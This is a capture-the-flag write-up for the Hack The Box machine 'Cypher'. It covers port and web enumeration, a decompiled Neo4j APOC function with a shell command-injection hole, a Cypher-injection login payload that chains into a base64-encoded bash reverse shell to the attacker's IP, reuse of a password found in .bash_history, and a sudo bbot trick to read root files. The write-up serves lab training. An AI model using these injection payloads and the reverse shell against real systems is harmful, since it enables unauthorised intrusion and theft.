---
title: Cypher
date: 2025-03-01T14:12
parent: "[[Fleeting MOC]]"
colinks: 
tags:
  - HTB
  - HTB_Medium
  - Cypher-Injection
  - Neo4j
  - ffuf
  - Reverse-Shell
  - Java-Decompiler
  - Command-Injection
  - Credential-Reuse
  - APOC
  - Sudo-Misconfiguration
  - Linux
descripton: Cypher is a midium level Linux machine on HTB that teaches you how subtle misconfigurations in Neo4j and custom APOC functions can lead to devastating command injections. You’ll start by uncovering a suspicious JAR file in the webserver’s /testing directory, revealing a poorly handled curl call. From there, a clever Cypher injection in the login mechanism enables remote command execution. After pivoting from the neo4j account to graphasm by discovering re-used credentials, the final challenge is to exploit a tool with sudo privileges to read sensitive root-owned files. Players will gain valuable experience with Cypher injection, Neo4j internals, and creative ways to elevate privileges on a Linux system.
---

# Cypher

- Machine Name: Cypher
- Operating System: Linux
- Difficulty: Medium
- User Blood:  [l1nvx](https://app.hackthebox.com/users/634163)
- System Blood: [jkr](https://app.hackthebox.com/users/77141)
---
## Initial Enumeration

We begin by scanning all TCP ports (`-p-`) and enabling script and version scanning (`-sC -sV`) against the target. Command:
 
```bash
nmap -sC -sV -p- 10.10.11.57 -oA nmap-output
```

Key findings:

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-01 14:13 EST
Nmap scan report for 10.10.11.57
Host is up (0.034s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
|_  256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cypher.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.73 seconds
```

- SSH (port 22) on an Ubuntu system.
- HTTP (port 80) running nginx 1.24.0 on Ubuntu.
- A redirect to http://cypher.htb/. 
	- We update our /etc/hosts to include:
	
```bash
echo "10.10.11.57 cypher.htb" | sudo tee -a /etc/hosts
```

With that in place, we can now browse to http://cypher.htb.
	
## Web Enumeration

### Directory Fuzzing with ffuf

Using `ffuf` we try to identify interesting files and folders on the webserver:

#### File Fuzzing

```bash
┌──(kali㉿kali)-[~/Labs/Cypher/scans/web-enum]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt -u http://cypher.htb/FUZZ -c -t 50

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cypher.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.html              [Status: 200, Size: 4562, Words: 1285, Lines: 163, Duration: 34ms]
login.html              [Status: 200, Size: 3671, Words: 863, Lines: 127, Duration: 33ms]
.                       [Status: 200, Size: 4562, Words: 1285, Lines: 163, Duration: 34ms]
about.html              [Status: 200, Size: 4986, Words: 1117, Lines: 179, Duration: 34ms]
logo.png                [Status: 200, Size: 206674, Words: 651, Lines: 876, Duration: 33ms]
:: Progress: [37050/37050] :: Job [1/1] :: 1506 req/sec :: Duration: [0:00:24] :: Errors: 0 ::
```

#### Directory Fuzzing

```bash
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://cypher.htb/FUZZ -c -t 50

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cypher.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

login                   [Status: 200, Size: 3671, Words: 863, Lines: 127, Duration: 36ms]
api                     [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 37ms]
about                   [Status: 200, Size: 4986, Words: 1117, Lines: 179, Duration: 34ms]
demo                    [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 36ms]
index                   [Status: 200, Size: 4562, Words: 1285, Lines: 163, Duration: 30ms]
testing                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 31ms]
index                   [Status: 200, Size: 4562, Words: 1285, Lines: 163, Duration: 31ms]
```

####  Subdomain Fuzzing

```bash
┌──(kali㉿kali)-[~/Labs/Cypher/scans/web-enum]
└─$ gobuster dns -d cypher.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50        
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     cypher.htb
[+] Threads:    50
[+] Timeout:    1s
[+] Wordlist:   /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Progress: 114441 / 114442 (100.00%)
===============================================================
Finished
===============================================================

===============================================================
```

#### Key Findings

Notable results included:
- `/api` → returns a 307 redirect
- `/demo` → also returns a 307 redirect
- `/login` → has a login form
- `/about`, `/index`, `/testing` directories
- Some static files like `index.html`, `login.html`, `logo.png`, etc.
### Observing the /testing Directory

Inside `/testing` folder, we find a downloadable `.jar` file.

![[Pasted image 20250301143152.png]]
Using the [Java Decompiler](https://java-decompiler.github.io/) we are able to decomiple the contents of the jar file:

![[Pasted image 20250301193422.png]]

In that jar file we find the following APOC custom function under `CustomFunctions.class`:

```java
package com.cypher.neo4j.apoc;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;
import java.util.stream.Stream;
import org.neo4j.procedure.Description;
import org.neo4j.procedure.Mode;
import org.neo4j.procedure.Name;
import org.neo4j.procedure.Procedure;

public class CustomFunctions {
  @Procedure(name = "custom.getUrlStatusCode", mode = Mode.READ)
  @Description("Returns the HTTP status code for the given URL as a string")
  public Stream<StringOutput> getUrlStatusCode(@Name("url") String url) throws Exception {
    if (!url.toLowerCase().startsWith("http://") && !url.toLowerCase().startsWith("https://"))
      url = "https://" + url; 
    String[] command = { "/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url };
    System.out.println("Command: " + Arrays.toString((Object[])command));
    Process process = Runtime.getRuntime().exec(command);
    BufferedReader inputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
    BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
    StringBuilder errorOutput = new StringBuilder();
    String line;
    while ((line = errorReader.readLine()) != null)
      errorOutput.append(line).append("\n"); 
    String statusCode = inputReader.readLine();
    System.out.println("Status code: " + statusCode);
    boolean exited = process.waitFor(10L, TimeUnit.SECONDS);
    if (!exited) {
      process.destroyForcibly();
      statusCode = "0";
      System.err.println("Process timed out after 10 seconds");
    } else {
      int exitCode = process.exitValue();
      if (exitCode != 0) {
        statusCode = "0";
        System.err.println("Process exited with code " + exitCode);
      } 
    } 
    if (errorOutput.length() > 0)
      System.err.println("Error output:\n" + errorOutput.toString()); 
    return Stream.of(new StringOutput(statusCode));
  }
  
  public static class StringOutput {
    public String statusCode;
    
    public StringOutput(String statusCode) {
      this.statusCode = statusCode;
    }
  }
}
```

Lets break this a little,

The key vulnerability here lies in the following line:

```java
String[] command = {
    "/bin/sh", "-c",
    "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url
};
```

The user-controlled url is directly appended to the shell command. There is no input validation or sanitization—meaning an attacker (us lol) can include malicious shell metacharacters (e.g., ;, |, &&) to run arbitrary commands (we will be doing this here shortly).


### Exploring the Login Functionality and Potential Injection

When visiting `/login`, a JavaScript snippet hints at:

```js
<script>
    // TODO: don't store user accounts in neo4j
    function doLogin(e) {
      e.preventDefault();
      var username = $("#usernamefield").val();
      var password = $("#passwordfield").val();
      $.ajax({
        url: '/api/auth',
        type: 'POST',
        contentType: 'application/json',
        data: JSON.stringify({ username: username, password: password }),
        success: function (r) {
          window.location.replace("/demo");
        },
```

## Cypher Injection

So our credentials are posted as JSON to `/api/auth`. We test if the parameter username is vulnerable to Cypher Injection.

```bash
POST /api/auth
Host: cypher.htb
Content-Type: application/json

{
  "username": "test' OR 1=1 //",
  "password": "test"
}
```

Response:

```bash
HTTP/1.1 400 Bad Request
Server: nginx/1.24.0 (Ubuntu)
Date: Sat, 01 Mar 2025 21:14:14 GMT
Content-Length: 3480
Connection: keep-alive

Traceback (most recent call last):
  File "/app/app.py", line 142, in verify_creds
    results = run_cypher(cypher)
  File "/app/app.py", line 63, in run_cypher
    return [r.data() for r in session.run(cypher)]
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/session.py", line 314, in run
    self._auto_result._run(
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py", line 221, in _run
    self._attach()
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py", line 409, in _attach
    self._connection.fetch_message()
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py", line 178, in inner
    func(*args, **kwargs)
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt.py", line 860, in fetch_message
    res = self._process_message(tag, fields)
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt5.py", line 370, in _process_message
    response.on_failure(summary_metadata or {})
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py", line 245, in on_failure
    raise Neo4jError.hydrate(**metadata)
neo4j.exceptions.CypherSyntaxError: {code: Neo.ClientError.Statement.SyntaxError} {message: Query cannot conclude with MATCH (must be a RETURN clause, a FINISH clause, an update clause, a unit subquery call, or a procedure call with no YIELD). (line 1, column 1 (offset: 0))
"MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'test' OR 1=1 //' return h.value as hash"
 ^}

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/app/app.py", line 165, in login
    creds_valid = verify_creds(username, password)
  File "/app/app.py", line 151, in verify_creds
    raise ValueError(f"Invalid cypher query: {cypher}: {traceback.format_exc()}")
ValueError: Invalid cypher query: MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'test' OR 1=1 //' return h.value as hash: Traceback (most recent call last):
  File "/app/app.py", line 142, in verify_creds
    results = run_cypher(cypher)
  File "/app/app.py", line 63, in run_cypher
    return [r.data() for r in session.run(cypher)]
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/session.py", line 314, in run
    self._auto_result._run(
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py", line 221, in _run
    self._attach()
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py", line 409, in _attach
    self._connection.fetch_message()
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py", line 178, in inner
    func(*args, **kwargs)
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt.py", line 860, in fetch_message
    res = self._process_message(tag, fields)
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt5.py", line 370, in _process_message
    response.on_failure(summary_metadata or {})
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py", line 245, in on_failure
    raise Neo4jError.hydrate(**metadata)
neo4j.exceptions.CypherSyntaxError: {code: Neo.ClientError.Statement.SyntaxError} {message: Query cannot conclude with MATCH (must be a RETURN clause, a FINISH clause, an update clause, a unit subquery call, or a procedure call with no YIELD). (line 1, column 1 (offset: 0))
"MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'test' OR 1=1 //' return h.value as hash"
 ^}
```

This tell us we have some type of [Cypher Injection](https://pentester.land/blog/cypher-injection-cheatsheet/)[^1]. Looking at the query it looks to be trying to run the following:

```cypher
MATCH (u:USER) -[:SECRET]-> (h:SHA1) 
WHERE u.name = 'test' return h.value as hash
```

Okay so we know we have injection after `test` so lets first craft a reverse shell:

```bash
bash -c 'exec bash -i &>/dev/tcp/10.10.14.22/9999 <&1'
```

and base64 it:

```bash
┌──(kali㉿kali)-[~/Labs/Cypher]
└─$ echo "bash -c 'exec bash -i &>/dev/tcp/10.10.14.22/9999 <&1'" | base64                     
YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuMjIvOTk5OSA8JjEnCg==
```

Because we found that suspicious custom function `custom.getUrlStatusCode("...")` spawns a shell running a `curl` command, we attempt a multi-statement injection. Something like:

- Escape out of the username check.
- Insert a `WITH 1 as n` or similar “bridge” so that we can `CALL` the custom function.
- Supply a command injection within the parameter to `custom.getUrlStatusCode("...")`.

The final injection might look like:

```json
{
  "username": "admin' OR 1=1 WITH 1 as n CALL custom.getUrlStatusCode('evil.com; ping -c5 10.10.14.22 #') YIELD statusCode RETURN n //",
  "password": "test1'+1=1--"
}
```

When the server processes that, it runs a single Cypher statement akin to:

```cypher
MATCH (u:USER)-[:SECRET]->(h:SHA1)
WHERE u.name = 'admin' OR 1=1
WITH 1 as n
CALL custom.getUrlStatusCode('evil.com; ping -c5 10.10.14.22 #') YIELD statusCode
RETURN n
```

We start `tcpdump` to test if we get icmp packets back from the vulnerable machine:

```bash
sudo tcpdump -i tun0 icmp
```

![[Pasted image 20250301195838.png]]

We see that the machine pings back to our attacker machine so know we can test for a reverse shell:

```json
{
  "username": "admin' OR 1=1 WITH 1 as n CALL custom.getUrlStatusCode('evil.com; echo YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuMjIvOTk5OSA8JjEnCg==|base64 -d|bash #') YIELD statusCode RETURN n //",
  "password": "anything"
}
```

Starting a `nc` listener on port 9999, we get a reverse shell to the vulnerable machine. Once triggered, you should get a shell as the `neo4j` user (since the injection occurs within the Neo4j process context).


## User

Now that we have a user we can look to move laterally to a user with greater privileges. The first thing we notice is a `.bash_history`, looking in this file suggests the Neo4j admin password is `cU4btyib.20xtCMCXkBmerhK`

```bash
neo4j@cypher:~$ cat .bash_history 
neo4j-admin dbms set-initial-password cU4btyib.20xtCMCXkBmerhK
```

We can verify or see additional stored data by using cypher-shell:

```bash
neo4j@cypher:~$ cypher-shell -a bolt://172.18.0.1:7687 -u neo4j -p cU4btyib.20>
Connected to Neo4j using Bolt protocol version 5.6 at bolt://172.18.0.1:7687 as user neo4j.
Type :help for a list of available commands or :exit to exit the shell.
Note that Cypher queries must end with a semicolon.
>....
```

Now we can query user objects, e.g.:

```
MATCH (u:USER)-[:SECRET]->(h:SHA1)
RETURN u.name AS username, h.value AS hash;
```

Which reveals something like:

```
>....+---------------------------------------------------------+
| username   | has                                        |
+---------------------------------------------------------+
| "graphasm" | "9f54ca4c130be6d529a56dee59dc2b2090e43acf" |
+---------------------------------------------------------+
```

The hash used wasn't crackable. We try reusing the found cU4btyib.20xtCMCXkBmerhK password for the graphasm user on the system, which gives us ssh access:

| User     | Password                 |
| -------- | ------------------------ |
| graphasm | cU4btyib.20xtCMCXkBmerhK |

```bash
graphasm@cypher:~$ whoami
graphasm
```

## Root

Checking our sudo permissions we see an interesting file:

```bash
graphasm@cypher:~$ sudo -l
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
```

So graphasm can run `/usr/local/bin/bbot` with no password as root.

Since we can get bbot to load custom Yara rules, we load in files from `/root/root.txt` and obtain the root user flag and read root level files. The tool logs debug info about loading the custom Yara rule:

```bash
sudo /usr/local/bin/bbot -cy /root/root.txt -d --dry-run
...
[DBUG] internal.excavate: Including Submodule ErrorExtractor
[DBUG] internal.excavate: Including Submodule FunctionalityExtractor
[DBUG] internal.excavate: Including Submodule HostnameExtractor
[DBUG] internal.excavate: Including Submodule JWTExtractor
[DBUG] internal.excavate: Including Submodule NonHttpSchemeExtractor
[DBUG] internal.excavate: Including Submodule ParameterExtractor
[DBUG] internal.excavate: Parameter Extraction disabled because no modules consume WEB_PARAMETER events
[DBUG] internal.excavate: Including Submodule SerializationExtractor
[DBUG] internal.excavate: Including Submodule URLExtractor
[DBUG] internal.excavate: Successfully loaded custom yara rules file [/root/root.txt]
[DBUG] internal.excavate: Final combined yara rule contents: 3237f1a1bcb27a41f331a78e06dfb8d1
...
```

With that we grab the flag: `3237f1a1bcb27a41f331a78e06dfb8d1`

---
## Command Metadata

bash_command:: `nmap -sC -sV -p- 10.10.11.57 -oA nmap-output`  
bash_note:: Perform full TCP port scan, plus default scripts and version detection, and save output.

bash_command:: `echo "10.10.11.57 cypher.htb" | sudo tee -a /etc/hosts`  
bash_note:: Add the target IP and hostname to your system’s hosts file.

bash_command:: `ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt -u http://cypher.htb/FUZZ -c -t 50`  
bash_note:: Fuzz for files on the webserver.

bash_command:: `ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://cypher.htb/FUZZ -c -t 50`  
bash_note:: Fuzz for directories on the webserver.

bash_command:: `gobuster dns -d cypher.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50`  
bash_note:: Enumerate possible subdomains for cypher.htb.

bash_command:: `sudo tcpdump -i tun0 icmp`  
bash_note:: Capture ICMP traffic on the VPN interface to detect pings from the target.

bash_command:: `nc -lvnp 9999`  
bash_note:: Start a netcat listener on port 9999 to catch reverse shells.

bash_command:: `echo "bash -c 'exec bash -i &>/dev/tcp/10.10.14.22/9999 <&1'" | base64`  
bash_note:: Base64-encode a reverse shell command for injection.

bash_command:: `cat .bash_history`  
bash_note:: Review the current user’s bash history for credentials or clues.

bash_command:: `cypher-shell -a bolt://172.18.0.1:7687 -u neo4j -p cU4btyib.20xtCMCXkBmerhK`  
bash_note:: Connect to the Neo4j database with the discovered admin password.

bash_command:: `sudo /usr/local/bin/bbot -cy /root/root.txt -d --dry-run`  
bash_note:: Run bbot as root (no password needed) to load a Yara rules file from a restricted path.
## References

[^1]: https://pentester.land/blog/cypher-injection-cheatsheet/